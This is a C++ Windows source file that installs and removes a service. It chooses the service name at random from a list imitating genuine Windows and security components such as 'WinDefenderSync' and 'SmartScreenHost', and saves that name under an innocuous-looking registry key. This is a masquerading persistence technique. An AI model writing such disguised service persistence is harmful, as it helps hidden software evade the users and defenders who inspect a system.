#include "ServiceInstaller.h"
#include <stdio.h>
#include <random>
#include <ctime>

static const wchar_t* REGISTRY_PATH = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\DeviceSync";
static const wchar_t* REGISTRY_VALUE = L"SvcIdentifier";

static const wchar_t* g_ServiceNames[] =
{
    L"WinDefenderSync",
    L"NvStreamMgr",
    L"SysHealthMonitor",
    L"WindowsTelemetryHost",
    L"RuntimeBrokerSvc",
    L"SecurityHealthAgent",
    L"DiagServiceHost",
    L"DeviceAssociationSvc",
    L"UserDataStorageSvc",
    L"AppXDeploySvc",
    L"WinBioCredProv",
    L"PerceptionSimSvc",
    L"GraphicsDevicePolicySvc",
    L"TokenBrokerCacheSvc",
    L"CapabilityAccessMgr",
    L"SmartScreenHost",
    L"DataIntegritySvc",
    L"SystemEventNotification",
    L"PlatformDeviceSync",
    L"WlanAutoProxy",
};

static const int g_NumNames = _countof ( g_ServiceNames );

std::wstring GenerateServiceName ( )
{
    std::mt19937 rng ( static_cast< unsigned int >( time ( nullptr ) ^ GetCurrentProcessId ( ) ) );
    std::uniform_int_distribution< int > dist ( 0 , g_NumNames - 1 );
    return g_ServiceNames[dist ( rng )];
}

bool SaveServiceName ( const std::wstring& name )
{
    HKEY hKey = NULL;
    LONG result = RegCreateKeyExW ( HKEY_LOCAL_MACHINE , REGISTRY_PATH , 0 , NULL ,
        REG_OPTION_NON_VOLATILE , KEY_WRITE , NULL , &hKey , NULL );
    if ( result != ERROR_SUCCESS ) return false;

    result = RegSetValueExW ( hKey , REGISTRY_VALUE , 0 , REG_SZ ,
        reinterpret_cast< const BYTE* >( name.c_str ( ) ) ,
        static_cast< DWORD >( ( name.size ( ) + 1 ) * sizeof ( wchar_t ) ) );

    RegCloseKey ( hKey );
    return result == ERROR_SUCCESS;
}

std::wstring LoadServiceName ( )
{
    HKEY hKey = NULL;
    LONG result = RegOpenKeyExW ( HKEY_LOCAL_MACHINE , REGISTRY_PATH , 0 , KEY_READ , &hKey );
    if ( result != ERROR_SUCCESS ) return L"";

    wchar_t buffer[256] = { };
    DWORD size = sizeof ( buffer );
    DWORD type = 0;
    result = RegQueryValueExW ( hKey , REGISTRY_VALUE , NULL , &type ,
        reinterpret_cast< BYTE* >( buffer ) , &size );

    RegCloseKey ( hKey );

    if ( result == ERROR_SUCCESS && type == REG_SZ )
        return std::wstring ( buffer );

    return L"";
}

void ClearServiceName ( )
{
    RegDeleteKeyW ( HKEY_LOCAL_MACHINE , REGISTRY_PATH );
}

void InstallService(PCWSTR pszServiceName,
    PCWSTR pszDisplayName,
    DWORD dwStartType,
    PCWSTR pszDependencies,
    PCWSTR pszAccount,
    PCWSTR pszPassword)
{
    wchar_t szPath[MAX_PATH];
    SC_HANDLE schSCManager = NULL;
    SC_HANDLE schService = NULL;

    if (GetModuleFileName(NULL, szPath, ARRAYSIZE(szPath)) == 0)
    {
        wprintf(L"GetModuleFileName failed w/err 0x%08lx\n", GetLastError());
        goto Cleanup;
    }

    schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT | SC_MANAGER_CREATE_SERVICE);
    if (schSCManager == NULL)
    {
        wprintf(L"OpenSCManager failed w/err 0x%08lx\n", GetLastError());
        goto Cleanup;
    }

    schService = CreateService(
        schSCManager,
        pszServiceName,
        pszDisplayName,
        SERVICE_ALL_ACCESS,
        SERVICE_WIN32_OWN_PROCESS,
        dwStartType,
        SERVICE_ERROR_NORMAL,
        szPath,
        NULL,
        NULL,
        pszDependencies,
        pszAccount,
        pszPassword);

    if (schService == NULL)
    {
        wprintf(L"CreateService failed w/err 0x%08lx\n", GetLastError());
        goto Cleanup;
    }

    wprintf(L"%s is installed.\n", pszServiceName);

    if ( StartServiceW ( schService , 0 , NULL ) )
    {
        wprintf ( L"%s started successfully.\n" , pszServiceName );
    }
    else
    {
        DWORD err = GetLastError ( );
        if ( err == ERROR_SERVICE_ALREADY_RUNNING )
            wprintf ( L"%s is already running.\n" , pszServiceName );
        else
            wprintf ( L"StartService failed w/err 0x%08lx\n" , err );
    }

Cleanup:
    if (schSCManager)
    {
        CloseServiceHandle(schSCManager);
        schSCManager = NULL;
    }
    if (schService)
    {
        CloseServiceHandle(schService);
        schService = NULL;
    }
}

void UninstallService(PCWSTR pszServiceName)
{
    SC_HANDLE schSCManager = NULL;
    SC_HANDLE schService = NULL;
    SERVICE_STATUS ssSvcStatus = {};

    schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
    if (schSCManager == NULL)
    {
        wprintf(L"OpenSCManager failed w/err 0x%08lx\n", GetLastError());
        goto Cleanup;
    }

    schService = OpenService(schSCManager, pszServiceName, SERVICE_STOP | SERVICE_QUERY_STATUS | DELETE);
    if (schService == NULL)
    {
        wprintf(L"OpenService failed w/err 0x%08lx\n", GetLastError());
        goto Cleanup;
    }

    if (ControlService(schService, SERVICE_CONTROL_STOP, &ssSvcStatus))
    {
        wprintf(L"Stopping %s.", pszServiceName);
        Sleep(1000);
        while (QueryServiceStatus(schService, &ssSvcStatus))
        {
            if (ssSvcStatus.dwCurrentState == SERVICE_STOP_PENDING)
            {
                wprintf(L".");
                Sleep(1000);
            }
            else break;
        }
        if (ssSvcStatus.dwCurrentState == SERVICE_STOPPED)
        {
            wprintf(L"\n%s is stopped.\n", pszServiceName);
        }
        else
        {
            wprintf(L"\n%s failed to stop.\n", pszServiceName);
        }
    }

    if (!DeleteService(schService))
    {
        wprintf(L"DeleteService failed w/err 0x%08lx\n", GetLastError());
        goto Cleanup;
    }

    wprintf(L"%s is removed.\n", pszServiceName);
    ClearServiceName ( );

Cleanup:
    if (schSCManager)
    {
        CloseServiceHandle(schSCManager);
        schSCManager = NULL;
    }
    if (schService)
    {
        CloseServiceHandle(schService);
        schService = NULL;
    }
}
